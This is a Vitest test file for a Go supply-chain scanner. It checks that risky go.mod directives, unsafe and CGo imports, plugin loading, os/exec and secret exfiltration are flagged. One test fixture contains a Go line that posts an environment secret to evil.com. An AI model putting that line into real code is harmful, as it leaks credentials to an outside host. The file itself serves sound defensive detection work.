import { describe, it, expect } from "vitest";
import { scanGoContent, isGoFile, GO_PATTERNS } from "../go-scanner.js";

describe("Go Module Scanner", () => {
  it("should identify Go-related files", () => {
    expect(isGoFile("go.mod")).toBe(true);
    expect(isGoFile("go.sum")).toBe(true);
    expect(isGoFile("main.go")).toBe(true);
    expect(isGoFile("handler_test.go")).toBe(true);
    expect(isGoFile("package.json")).toBe(false);
  });

  describe("go.mod scanning", () => {
    it("should detect replace directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nreplace example.com/lib => ../my-fork";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_REPLACE_DIRECTIVE")).toBe(true);
    });

    it("should detect retract directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nretract v1.0.0";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_RETRACT_DIRECTIVE")).toBe(true);
    });

    it("should not flag clean go.mod", () => {
      const content = [
        "module example.com/app",
        "",
        "go 1.21",
        "",
        "require (",
        "    github.com/gin-gonic/gin v1.9.1",
        ")",
      ].join("\n");
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings).toHaveLength(0);
    });
  });

  describe("Go source scanning", () => {
    it("should detect CGo import", () => {
      const content = 'package main\n\nimport "C"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_CGO_IMPORT")).toBe(true);
    });

    it("should detect unsafe import", () => {
      const content = 'package main\n\nimport "unsafe"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_UNSAFE_IMPORT")).toBe(true);
    });

    it("should detect plugin.Open", () => {
      const content = 'package main\n\nfunc load() { p, _ := plugin.Open("module.so") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_PLUGIN_LOAD")).toBe(true);
    });

    it("should detect os/exec usage", () => {
      const content = 'package main\n\nimport "os/exec"\n\nfunc run() { exec.Command("ls") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_OS_EXEC")).toBe(true);
    });

    it("should detect env exfiltration pattern", () => {
      const content = 'func exfil() {\n    http.Post("https://evil.com", "text/plain", strings.NewReader(os.Getenv("SECRET")))\n}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
    });

    it("should not flag clean Go source", () => {
      const content = [
        "package main",
        "",
        'import "fmt"',
        "",
        "func main() {",
        '    fmt.Println("Hello, World!")',
        "}",
      ].join("\n");
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings).toHaveLength(0);
    });
  });

  it("should include line numbers", () => {
    const content = "module x\n\ngo 1.21\n\nreplace x => ../y";
    const findings = scanGoContent(content, "go.mod", "mod");
    expect(findings.find((f) => f.rule === "GO_REPLACE_DIRECTIVE")?.line).toBe(5);
  });

  it("should have patterns array", () => {
    expect(GO_PATTERNS.length).toBeGreaterThan(5);
    for (const p of GO_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
